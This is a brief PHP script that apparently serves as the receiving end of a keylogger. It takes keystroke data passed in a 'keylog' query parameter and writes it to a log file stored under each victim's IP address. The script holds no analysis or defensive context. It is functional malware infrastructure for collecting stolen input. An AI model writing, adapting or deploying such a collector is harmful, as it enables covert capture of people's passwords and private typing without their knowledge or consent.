<?php
$ip = $_SERVER['REMOTE_ADDR'];
$stringData = $_GET["keylog"];
if($_GET["keylog"] == "undefined"){
die();
}
else
{
file_put_contents('text/'.$ip.'/log.txt', $stringData);
}
?>